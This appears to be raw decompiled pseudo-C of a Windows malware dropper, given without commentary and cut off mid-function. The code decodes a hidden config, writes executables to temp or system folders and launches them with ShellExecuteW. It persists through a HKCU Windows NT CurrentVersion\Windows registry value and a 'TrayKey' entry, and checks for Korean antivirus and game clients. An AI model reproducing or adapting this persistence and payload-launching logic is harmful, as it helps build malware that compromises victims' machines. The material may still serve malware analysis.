typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef int (*_onexit_t)(void);

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};




void FUN_00401000(void)

{
  int in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  FUN_00402960();
  _memset((void *)(in_EAX + 4),0,0x200);
  _memset((void *)(in_EAX + 0x204),0,0x200);
  _memset((void *)(in_EAX + 0x408),0,0x80);
  _memset((void *)(in_EAX + 0x488),0,0x80);
  _memset((void *)(in_EAX + 0x50a),0,0x80);
  puVar2 = (undefined4 *)(in_EAX + 0x58c);
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  puVar2 = (undefined4 *)(in_EAX + 0x9bc);
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  GetTempPathW(0x104,(LPWSTR)(in_EAX + 0x5ac));
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)(in_EAX + 0x7b4),0x104);
  return;
}



void __thiscall FUN_0040109c(void *this,int param_1)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  int *piVar4;
  int local_210 [129];
  uint local_c;
  
  local_c = DAT_00422040 ^ (uint)&stack0xfffffffc;
  _memset(local_210,0,0x200);
  iVar1 = FUN_00401140(local_210,(int *)this,(uint)(param_1 != 0));
  if (iVar1 != 0) {
    uVar2 = 0;
    do {
      *(byte *)((int)local_210 + uVar2) = ~*(byte *)((int)local_210 + uVar2);
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x200);
    if (local_210[0] == 0x504d534d) {
      iVar1 = 0x80;
      piVar3 = local_210;
      if (param_1 == 0) {
        piVar4 = (int *)((int)this + 0x204);
      }
      else {
        piVar4 = (int *)((int)this + 4);
      }
      for (; iVar1 != 0; iVar1 = iVar1 + -1) {
        *piVar4 = *piVar3;
        piVar3 = piVar3 + 1;
        piVar4 = piVar4 + 1;
      }
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __thiscall FUN_00401140(void *this,int *param_1,int param_2)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *unaff_EBX;
  FILE *local_214;
  WCHAR local_210;
  undefined local_20e [110];
  undefined local_1a0 [408];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)local_1a0;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  local_214 = (FILE *)0x0;
  if ((this != (void *)0x0) && (unaff_EBX != (wchar_t *)0x0)) {
    pwVar2 = unaff_EBX;
    do {
      wVar1 = *pwVar2;
      pwVar2 = pwVar2 + 1;
    } while (wVar1 != L'\0');
    if ((int)pwVar2 - (int)(unaff_EBX + 1) >> 1 != 0) {
      if ((param_2 == 0) && (*param_1 == 3)) {
        GetSystemDirectoryW(&local_210,0x104);
        _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_0041dcdc);
      }
      else {
        GetTempPathW(0x104,&local_210);
      }
      _wcscat_s(&local_210,0x104,unaff_EBX);
      __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_0041dce0);
      if (local_214 != (FILE *)0x0) {
        _fread(this,0x200,1,local_214);
        _fclose(local_214);
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_1a0);
  return;
}



void FUN_00401255(LPWSTR param_1)

{
  GetSystemDirectoryW(param_1,0x104);
  _wcscat_s(param_1,0x104,(wchar_t *)&DAT_0041dcdc);
  return;
}



void FUN_0040127c(int param_1)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  int local_210 [129];
  uint local_c;
  
  local_c = DAT_00422040 ^ (uint)&stack0xfffffffc;
  iVar1 = *(int *)(param_1 + 4);
  piVar4 = (int *)(param_1 + 4);
  piVar5 = local_210;
  for (iVar3 = 0x80; iVar3 != 0; iVar3 = iVar3 + -1) {
    *piVar5 = *piVar4;
    piVar4 = piVar4 + 1;
    piVar5 = piVar5 + 1;
  }
  if (iVar1 == 0x504d534d) {
    uVar2 = 0;
    do {
      *(byte *)((int)local_210 + uVar2) = ~*(byte *)((int)local_210 + uVar2);
      uVar2 = uVar2 + 1;
    } while (uVar2 < 0x200);
    FUN_004012e4();
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004012e4(void)

{
  short *psVar1;
  short *psVar2;
  void *unaff_EDI;
  FILE *local_214;
  WCHAR local_210;
  undefined local_20e [118];
  undefined local_198 [400];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)local_198;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  if (unaff_EDI != (void *)0x0) {
    local_214 = (FILE *)0x0;
    psVar1 = &DAT_0041dce8;
    do {
      psVar2 = psVar1;
      psVar1 = psVar2 + 1;
    } while (*psVar2 != 0);
    if ((int)(psVar2 + -0x20ee74) >> 1 == 0) {
      GetTempPathW(0x104,&local_210);
      _wcscat_s(&local_210,0x104,u_golfinfo_ini_0041dca8);
      __wfopen_s(&local_214,&local_210,(wchar_t *)&DAT_0041dcec);
    }
    else {
      __wfopen_s(&local_214,&DAT_0041dce8,(wchar_t *)&DAT_0041dcec);
    }
    if (local_214 != (FILE *)0x0) {
      _fwrite(unaff_EDI,0x200,1,local_214);
      _fclose(local_214);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_198);
  return;
}



void FUN_004013c2(int *param_1)

{
  LPWSTR unaff_EDI;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  if (*param_1 == 3) {
    FUN_00401255(&local_210);
  }
  else {
    GetTempPathW(0x104,&local_210);
  }
  wsprintfW(unaff_EDI,u__s_s_exe_0041dcf4,&local_210);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401439(void)

{
  wchar_t wVar1;
  LSTATUS LVar2;
  wchar_t *pwVar3;
  wchar_t *unaff_EBX;
  HKEY local_2dc;
  wchar_t local_2d8;
  undefined local_2d6 [518];
  wchar_t local_d0;
  undefined local_ce [82];
  undefined local_7c [116];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)local_7c;
  local_d0 = L'\0';
  local_2dc = (HKEY)0x0;
  _memset(local_ce,0,0xc6);
  local_2d8 = L'\0';
  _memset(local_2d6,0,0x206);
  _wcscpy_s(&local_d0,100,u_Software__0041dd08);
  _wcscat_s(&local_d0,100,u_Microsoft__0041dd1c);
  _wcscat_s(&local_d0,100,u_Windows_NT__0041dd34);
  _wcscat_s(&local_d0,100,u_CurrentVersion__0041dd4c);
  _wcscat_s(&local_d0,100,u_Windows_0041dd6c);
  _wcscpy_s(&local_2d8,0x104,unaff_EBX);
  LVar2 = RegOpenKeyExW((HKEY)0x80000001,&local_d0,0,3,&local_2dc);
  if (LVar2 == 0) {
    pwVar3 = &local_2d8;
    do {
      wVar1 = *pwVar3;
      pwVar3 = pwVar3 + 1;
    } while (wVar1 != L'\0');
    LVar2 = RegSetValueExW(local_2dc,(LPCWSTR)&DAT_0041dd7c,0,1,(BYTE *)&local_2d8,
                           ((int)pwVar3 - (int)local_2d6 >> 1) * 2 + 2);
    if (LVar2 == 0) {
      RegCloseKey(local_2dc);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_7c);
  return;
}



void __fastcall FUN_00401565(int *param_1)

{
  WCHAR WVar1;
  wchar_t wVar2;
  short sVar3;
  int iVar4;
  undefined4 *puVar5;
  DWORD DVar6;
  int iVar7;
  int iVar8;
  int *piVar9;
  HANDLE pvVar10;
  short *psVar11;
  int *piVar12;
  undefined4 *puVar13;
  int local_e80;
  int local_e78;
  undefined local_e74 [8];
  int local_e6c;
  undefined4 uStack_e4e;
  undefined local_e4a [214];
  uint local_d74;
  undefined2 local_d70;
  uint local_d6e;
  undefined2 local_d6a;
  short local_d66 [16];
  wchar_t local_d46 [133];
  wchar_t local_c3c;
  undefined local_c3a [518];
  wchar_t local_a34;
  undefined local_a32 [518];
  WCHAR local_82c;
  undefined local_82a [518];
  WCHAR local_624;
  undefined local_622 [518];
  wchar_t local_41c;
  undefined local_41a [518];
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_41c = L'\0';
  local_e80 = 0;
  _memset(local_41a,0,0x206);
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_c3c = L'\0';
  _memset(local_c3a,0,0x206);
  _wcscpy_s(&local_c3c,0x104,(wchar_t *)(param_1 + 0x16b));
  _wcscat_s(&local_c3c,0x104,u_HGDraw_dll_0041dd84);
  DeleteFileW(&local_c3c);
  DVar6 = GetTickCount();
  FUN_004097e0(DVar6);
  local_a34 = L'\0';
  _memset(local_a32,0,0x206);
  iVar7 = FUN_0040109c(param_1,1);
  if (iVar7 == 0) {
    _memset(local_e74,0,0x236);
    local_e80 = FUN_00402ce0();
    if (local_e80 != 0) {
      psVar11 = local_d66;
      iVar8 = 0x408 - (int)psVar11;
      do {
        sVar3 = *psVar11;
        *(short *)((int)param_1 + iVar8 + (int)psVar11) = sVar3;
        psVar11 = psVar11 + 1;
      } while (sVar3 != 0);
      *(undefined2 *)(param_1 + 0x142) = local_d6a;
      *(undefined2 *)((int)param_1 + 0x58a) = local_d70;
      FUN_00403100(local_d6e);
      FUN_00403100(local_d74);
      _wcscpy_s((wchar_t *)(param_1 + 0x163),0x10,local_d46);
      param_1[0x101] = local_e6c;
    }
  }
  else {
    _wcscpy_s(&local_41c,0x104,(wchar_t *)(param_1 + 0x16b));
    _wcscat_s(&local_41c,0x104,(wchar_t *)(param_1 + 99));
    _wcscat_s(&local_41c,0x104,u__exe_0041dd9c);
    DeleteFileW(&local_41c);
    piVar12 = param_1 + 0x6b;
    _wcscpy_s((wchar_t *)(param_1 + 0x163),0x10,(wchar_t *)piVar12);
    FUN_004013c2(param_1);
    iVar8 = FUN_00401cae((int)param_1,(wchar_t *)piVar12);
    if (iVar8 == 1) goto LAB_00401c99;
    local_624 = L'\0';
    _memset(local_622,0,0x206);
    uStack_e4e._2_2_ = 0;
    _memset(local_e4a,0,0x206);
    piVar9 = piVar12;
    do {
      wVar2 = *(wchar_t *)piVar9;
      *(wchar_t *)(local_622 + (-2 - (int)piVar12) + (int)piVar9) = wVar2;
      piVar9 = (int *)((int)piVar9 + 2);
    } while (wVar2 != L'\0');
    iVar8 = -2 - (int)piVar12;
    do {
      wVar2 = *(wchar_t *)piVar12;
      *(wchar_t *)(local_e4a + iVar8 + (int)piVar12) = wVar2;
      piVar12 = (int *)((int)piVar12 + 2);
    } while (wVar2 != L'\0');
    puVar5 = &uStack_e4e;
    do {
      puVar13 = puVar5;
      puVar5 = (undefined4 *)((int)puVar13 + 2);
    } while (*(short *)((int)puVar13 + 2) != 0);
    *(undefined4 *)((int)puVar13 + 2) = u__STOP_0041dda8._0_4_;
    *(undefined4 *)((int)puVar13 + 6) = u__STOP_0041dda8._4_4_;
    *(undefined4 *)((int)puVar13 + 10) = u__STOP_0041dda8._8_4_;
    pvVar10 = OpenEventW(0x20000,0,&local_624);
    if (pvVar10 != (HANDLE)0x0) {
      CloseHandle(pvVar10);
      CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)((int)&uStack_e4e + 2));
      local_e78 = 0;
      while ((pvVar10 = OpenEventW(0x20000,0,&local_624), pvVar10 != (HANDLE)0x0 && (local_e78 < 5))
            ) {
        CloseHandle(pvVar10);
        local_e78 = local_e78 + 1;
        Sleep(500);
      }
    }
    Sleep(1000);
    DeleteFileW(&local_214);
    piVar12 = param_1 + 2;
    iVar8 = 0x488 - (int)piVar12;
    do {
      sVar3 = *(short *)piVar12;
      *(short *)((int)param_1 + iVar8 + (int)piVar12) = sVar3;
      piVar12 = (int *)((int)piVar12 + 2);
    } while (sVar3 != 0);
    psVar11 = (short *)((int)param_1 + 0x8a);
    iVar8 = 0x408 - (int)psVar11;
    do {
      sVar3 = *psVar11;
      *(short *)((int)param_1 + iVar8 + (int)psVar11) = sVar3;
      psVar11 = psVar11 + 1;
    } while (sVar3 != 0);
    psVar11 = (short *)((int)param_1 + 0xaa);
    iVar8 = 0x50a - (int)psVar11;
    do {
      sVar3 = *psVar11;
      *(short *)((int)param_1 + iVar8 + (int)psVar11) = sVar3;
      psVar11 = psVar11 + 1;
    } while (sVar3 != 0);
    *(undefined2 *)(param_1 + 0x142) = *(undefined2 *)(param_1 + 0x22);
    *(undefined2 *)((int)param_1 + 0x58a) = *(undefined2 *)((int)param_1 + 0x12a);
    param_1[0x101] = param_1[0x73];
    _wcscpy_s((wchar_t *)(param_1 + 0x26f),0x10,(wchar_t *)(param_1 + 99));
  }
  local_82c = L'\0';
  _memset(local_82a,0,0x206);
  iVar8 = FUN_0040109c(param_1,0);
  if (iVar8 != 0) {
    psVar11 = &DAT_0041ddb4;
    do {
      sVar3 = *psVar11;
      *(short *)((int)param_1 + -0x41d8aa + (int)psVar11) = sVar3;
      psVar11 = psVar11 + 1;
    } while (sVar3 != 0);
    psVar11 = (short *)((int)param_1 + 0x28a);
    iVar4 = 0x408 - (int)psVar11;
    do {
      sVar3 = *psVar11;
      *(short *)((int)param_1 + iVar4 + (int)psVar11) = sVar3;
      psVar11 = psVar11 + 1;
    } while (sVar3 != 0);
    piVar12 = param_1 + 0x82;
    iVar4 = 0x488 - (int)piVar12;
    do {
      sVar3 = *(short *)piVar12;
      *(short *)((int)param_1 + iVar4 + (int)piVar12) = sVar3;
      piVar12 = (int *)((int)piVar12 + 2);
    } while (sVar3 != 0);
    *(undefined2 *)(param_1 + 0x142) = *(undefined2 *)(param_1 + 0xa2);
    *(undefined2 *)((int)param_1 + 0x58a) = *(undefined2 *)((int)param_1 + 0x32a);
    param_1[0x101] = 5;
    if (*param_1 == 3) {
      FUN_00401255(&local_82c);
    }
    else {
      GetTempPathW(0x104,&local_82c);
    }
    _wcscat_s(&local_82c,0x104,u_golfset_ini_0041dcc4);
    DeleteFileW(&local_82c);
  }
  *(undefined2 *)(param_1 + 0x22) = 0x51;
  *(undefined2 *)((int)param_1 + 0x12a) = 0x2b70;
  param_1[1] = 0x504d534d;
  psVar11 = &DAT_0041ddb4;
  do {
    sVar3 = *psVar11;
    *(short *)((int)param_1 + -0x41dd0a + (int)psVar11) = sVar3;
    psVar11 = psVar11 + 1;
  } while (sVar3 != 0);
  psVar11 = &DAT_0041ddd0;
  do {
    sVar3 = *psVar11;
    *(short *)((int)(param_1 + -0x107772) + (int)psVar11) = sVar3;
    psVar11 = psVar11 + 1;
  } while (sVar3 != 0);
  psVar11 = &DAT_0041ddec;
  do {
    sVar3 = *psVar11;
    *(short *)((int)param_1 + -0x41dd62 + (int)psVar11) = sVar3;
    psVar11 = psVar11 + 1;
  } while (sVar3 != 0);
  param_1[0x73] = 5;
  if (((iVar7 != 0) || (local_e80 != 0)) || (iVar8 != 0)) {
    _wcscpy_s((wchar_t *)((int)param_1 + 0x8a),0x10,(wchar_t *)(param_1 + 0x102));
    _wcscpy_s((wchar_t *)(param_1 + 2),0x40,(wchar_t *)(param_1 + 0x122));
    _wcscpy_s((wchar_t *)((int)param_1 + 0xaa),0x40,(wchar_t *)((int)param_1 + 0x50a));
    *(undefined2 *)(param_1 + 0x22) = *(undefined2 *)(param_1 + 0x142);
    *(undefined2 *)((int)param_1 + 0x12a) = *(undefined2 *)((int)param_1 + 0x58a);
    param_1[0x73] = param_1[0x101];
    if (param_1[0x101] == 0) {
      param_1[0x73] = 5;
    }
  }
  psVar11 = &DAT_0041ddb4;
  do {
    sVar3 = *psVar11;
    *(short *)((int)param_1 + -0x41dd0a + (int)psVar11) = sVar3;
    psVar11 = psVar11 + 1;
  } while (sVar3 != 0);
  if ((*(short *)(param_1 + 2) != 0) && (*(short *)(param_1 + 0x22) != 0)) {
    piVar12 = param_1 + 0x26f;
    param_1[1] = 0x504d534d;
    piVar9 = piVar12;
    do {
      WVar1 = *(WCHAR *)piVar9;
      piVar9 = (int *)((int)piVar9 + 2);
    } while (WVar1 != L'\0');
    if (((int)piVar9 - ((int)param_1 + 0x9be) >> 1 != 0) &&
       (pvVar10 = OpenEventW(0x20000,0,(LPCWSTR)piVar12), pvVar10 != (HANDLE)0x0)) {
      _wcscpy_s((wchar_t *)(param_1 + 99),0x10,(wchar_t *)piVar12);
    }
    if (*(wchar_t *)(param_1 + 99) == L'\0') {
      FUN_00403180((int)&local_a34);
      _wcscpy_s((wchar_t *)(param_1 + 99),0x10,&local_a34);
    }
    piVar12 = param_1 + 0x6b;
    if (*(wchar_t *)piVar12 == L'\0') {
      FUN_00403180((int)&local_a34);
      _wcscpy_s((wchar_t *)piVar12,0x10,&local_a34);
      piVar9 = param_1 + 0x163;
      do {
        wVar2 = *(wchar_t *)piVar9;
        piVar9 = (int *)((int)piVar9 + 2);
      } while (wVar2 != L'\0');
      if ((int)piVar9 - ((int)param_1 + 0x58e) >> 1 != 0) {
        _wcscpy_s((wchar_t *)piVar12,0x10,(wchar_t *)(param_1 + 0x163));
      }
    }
    param_1[0x74] = 0x10002b4;
    if (param_1[0x73] == 0) {
      param_1[0x73] = 5;
    }
    iVar7 = FUN_0040127c((int)param_1);
    if (iVar7 != 0) {
      FUN_004013c2(param_1);
      FUN_004032b0(&local_214);
      FUN_00401439();
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_214,&DAT_0041dce8,(LPCWSTR)0x0,1);
    }
  }
LAB_00401c99:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00401cae(int param_1,wchar_t *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  wchar_t local_30;
  undefined4 local_2e [9];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_30 = L'\0';
  puVar2 = local_2e;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  _wcscpy_s(&local_30,0x14,param_2);
  _wcscat_s(&local_30,0x14,u__exe_0041dd9c);
  _wcsstr((wchar_t *)(param_1 + 0x7b4),&local_30);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401d1a(void)

{
  WCHAR local_418;
  undefined local_416 [2];
  undefined2 local_414;
  undefined local_39c [396];
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)local_39c;
  local_418 = L'\0';
  _memset(local_416,0,0x206);
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  GetSystemWindowsDirectoryW(&local_418,0x104);
  local_414 = 0;
  wsprintfW(&local_210,u__s_s_0041deac,&local_418,u__Hangame_KOREAN_HanUninstall_exe_0041de68);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_0041deac,&local_418,u__NEOWIZ_PMang_common_PMLauncher__0041deb8);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_0041deac,&local_418,u__Netmarble_Common_NetMarbleEndWe_0041df00);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_0041deac,&local_418,u__Program_Files_AhnLab_V3Lite30_V_0041df50);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_0041deac,&local_418,u__Program_Files_ESTsoft_ALYac_AYL_0041dfa8);
  GetFileAttributesW(&local_210);
  wsprintfW(&local_210,u__s_s_0041deac,&local_418,u__Program_Files_naver_NaverAgent__0041e000);
  GetFileAttributesW(&local_210);
  ___security_check_cookie_4(local_8 ^ (uint)local_39c);
  return;
}



void FUN_00401eaf(void)

{
  short sVar1;
  wchar_t wVar2;
  undefined4 uVar3;
  wchar_t *pwVar4;
  short *psVar5;
  int iVar6;
  wchar_t *pwVar7;
  undefined4 *unaff_EBX;
  undefined4 *puVar8;
  undefined local_cc [74];
  undefined4 local_82;
  undefined2 uStack_7e;
  undefined4 local_7c;
  short local_74 [38];
  undefined2 local_28;
  undefined4 local_26 [7];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_28 = 0;
  puVar8 = local_26;
  for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  _memset(local_cc,0,0xa0);
  _memset(unaff_EBX,0,0x200);
  iVar6 = FUN_00403a50();
  if (iVar6 != 0) {
    uVar3 = FUN_00401d1a();
    *unaff_EBX = uVar3;
    unaff_EBX[1] = (((uint)DAT_00424733 * 0x100 + (uint)DAT_00424732) * 0x100 + (uint)DAT_00424731)
                   * 0x100 + (uint)DAT_00424730;
    unaff_EBX[4] = local_82;
    unaff_EBX[3] = local_7c;
    psVar5 = local_74;
    *(undefined2 *)(unaff_EBX + 5) = uStack_7e;
    unaff_EBX[2] = 0x10002b4;
    iVar6 = 0x16 - (int)psVar5;
    do {
      sVar1 = *psVar5;
      *(short *)((int)unaff_EBX + iVar6 + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    pwVar4 = u_UnKnown_00423090 + DAT_00423060 * 10;
    pwVar7 = (wchar_t *)((int)unaff_EBX + 0x96);
    do {
      wVar2 = *pwVar4;
      *pwVar7 = wVar2;
      pwVar4 = pwVar4 + 1;
      pwVar7 = pwVar7 + 1;
    } while (wVar2 != L'\0');
    *(uint *)((int)unaff_EBX + 0x196) = DAT_0042482e;
    *(undefined4 *)((int)unaff_EBX + 0x19a) = DAT_00424832;
    psVar5 = &DAT_00424836;
    do {
      sVar1 = *psVar5;
      *(short *)((int)(unaff_EBX + -0x1091a6) + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    FUN_00403100(DAT_0042482e);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00401fdf(void)

{
  WCHAR WVar1;
  short sVar2;
  short *psVar3;
  HANDLE pvVar4;
  LSTATUS LVar5;
  short *psVar6;
  WCHAR *pWVar7;
  int iVar8;
  undefined4 *puVar9;
  undefined4 *puVar10;
  LPCWSTR dwMilliseconds;
  DWORD local_318;
  DWORD local_314;
  DWORD local_310;
  void *local_30c;
  HKEY local_308;
  undefined4 local_304 [26];
  undefined local_29a [94];
  WCHAR local_23c;
  undefined local_23a [522];
  WCHAR local_30;
  undefined4 local_2e [9];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_23c = L'\0';
  _memset(local_23a,0,0x206);
  local_30 = L'\0';
  puVar9 = local_2e;
  for (iVar8 = 9; iVar8 != 0; iVar8 = iVar8 + -1) {
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  *(undefined2 *)puVar9 = 0;
  local_314 = 0;
  local_318 = 0x104;
  psVar3 = &DAT_00424b28;
  do {
    psVar6 = psVar3;
    psVar3 = psVar6 + 1;
  } while (*psVar6 != 0);
  if (((int)(psVar6 + -0x212594) >> 1 == 0) ||
     (pvVar4 = OpenEventW(0x20000,0,&DAT_00424b28), pvVar4 == (HANDLE)0x0)) {
    LVar5 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041ddf8,0,0xf003f,
                          &local_308);
    if (LVar5 == 0) {
      LVar5 = RegQueryValueExW(local_308,u_TrayKey_0041e060,(LPDWORD)0x0,&local_314,
                               (LPBYTE)&local_30,&local_318);
      if ((LVar5 == 0) && (pvVar4 = OpenEventW(0x20000,0,&local_30), pvVar4 != (HANDLE)0x0)) {
        RegCloseKey(local_308);
        goto LAB_00402249;
      }
      RegCloseKey(local_308);
    }
    local_310 = 0;
    GetTempPathW(0x104,&local_23c);
    psVar3 = &DAT_00424b28;
    do {
      psVar6 = psVar3;
      psVar3 = psVar6 + 1;
    } while (*psVar6 != 0);
    if ((int)(psVar6 + -0x212594) >> 1 == 0) {
      _wcscat_s(&local_23c,0x104,&DAT_0041e070);
      iVar8 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0041e070 + iVar8);
        *(short *)((int)local_2e + iVar8 + -2) = sVar2;
        iVar8 = iVar8 + 2;
      } while (sVar2 != 0);
    }
    else {
      _wcscat_s(&local_23c,0x104,&DAT_00424b28);
      iVar8 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_00424b28 + iVar8);
        *(short *)((int)local_2e + iVar8 + -2) = sVar2;
        iVar8 = iVar8 + 2;
      } while (sVar2 != 0);
    }
    _wcscat_s(&local_23c,0x104,u__exe_0041dd9c);
    local_30c = FUN_00404a90(&local_310);
    if (local_30c != (void *)0x0) {
      dwMilliseconds = &local_23c;
      FUN_00404b10(dwMilliseconds,local_30c);
      Sleep((DWORD)dwMilliseconds);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_23c,&DAT_0041dce8,(LPCWSTR)0x0,1);
      puVar9 = (undefined4 *)u_Software_Microsoft_Windows_NT_Cu_0041ddf8;
      puVar10 = local_304;
      for (iVar8 = 0x1a; iVar8 != 0; iVar8 = iVar8 + -1) {
        *puVar10 = *puVar9;
        puVar9 = puVar9 + 1;
        puVar10 = puVar10 + 1;
      }
      *(undefined2 *)puVar10 = *(undefined2 *)puVar9;
      _memset(local_29a,0,0x5e);
      LVar5 = RegOpenKeyExW((HKEY)0x80000001,(LPCWSTR)local_304,0,3,&local_308);
      if (LVar5 == 0) {
        pWVar7 = &local_30;
        do {
          WVar1 = *pWVar7;
          pWVar7 = pWVar7 + 1;
        } while (WVar1 != L'\0');
        LVar5 = RegSetValueExW(local_308,u_TrayKey_0041e060,0,1,(BYTE *)&local_30,
                               ((int)pWVar7 - (int)local_2e >> 1) * 2 + 2);
        if (LVar5 == 0) {
          RegCloseKey(local_308);
        }
      }
      FUN_00409875(local_30c);
    }
  }
LAB_00402249:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_0040225a(HINSTANCE param_1)

{
  int iVar1;
  HWND pHVar2;
  DWORD DVar3;
  undefined auStack_17c4 [4];
  undefined4 local_17c0;
  undefined4 local_17bc;
  int local_17a8 [641];
  undefined4 local_da4;
  undefined4 local_da0;
  undefined4 local_d9c;
  undefined4 local_d98;
  undefined4 local_d14;
  undefined4 local_c90;
  undefined4 local_c8c;
  undefined4 local_c88;
  undefined4 local_c84;
  undefined4 local_c00;
  int aiStack_bf8 [632];
  wchar_t local_218;
  undefined local_216 [522];
  uint local_c;
  
  local_c = DAT_00422040 ^ (uint)auStack_17c4;
  local_17c0 = 0;
  local_17bc = 0;
  FUN_004027b4();
  local_d9c = 0xffffffff;
  local_17a8[0] = 0;
  local_d98 = 0;
  local_d14 = 0;
  local_c90 = 0;
  local_c8c = 0;
  local_c88 = 0;
  local_c84 = 0;
  local_c00 = 0;
  local_da4 = 5;
  local_da0 = 1;
  FUN_00402844(local_17a8);
  local_218 = L'\0';
  _memset(local_216,0,0x206);
  FUN_00402960();
  Sleep(2000);
  FUN_00401000();
  iVar1 = FUN_00401565(aiStack_bf8);
  if (iVar1 != 0) {
    FUN_004033d0();
LAB_00402343:
                    // WARNING: Subroutine does not return
    ExitProcess(0);
  }
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_004240e0,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_00424018,100);
  FUN_00402498();
  DAT_004241a8 = param_1;
  pHVar2 = CreateWindowExW(0,(LPCWSTR)&DAT_00424018,(LPCWSTR)&DAT_004240e0,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  if (pHVar2 != (HWND)0x0) {
    iVar1 = FUN_00402509();
    if (iVar1 != 0) {
      LoadAcceleratorsW(param_1,(LPCWSTR)0x6d);
      if ((DAT_00424828 != 0) && (DAT_0042482c != 0)) {
        FUN_00403c10(DAT_00424828);
        DAT_0042307c._0_2_ = DAT_0042482c;
      }
      GetTickCount();
      FUN_00402799((wchar_t *)&DAT_00424da0,u_tmp4_X_exe_0041e094);
      FUN_00403cf0();
      FUN_00403c90();
      _wcscat_s(&local_218,0x104,(wchar_t *)&DAT_0041dcdc);
      _wcscat_s(&local_218,0x104,(wchar_t *)&DAT_00424da0);
      DVar3 = GetFileAttributesW(&local_218);
      if (DVar3 != 0xffffffff) {
        Sleep(500);
        ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_218,&DAT_0041dce8,(LPCWSTR)0x0,1);
      }
      FUN_00401fdf();
      goto LAB_00402343;
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)auStack_17c4);
  return;
}



void FUN_00402498(void)

{
  HINSTANCE in_EAX;
  WNDCLASSEXW local_34;
  
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_004026be;
  local_34.hInstance = in_EAX;
  local_34.hIcon = LoadIconW(in_EAX,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)0x6;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
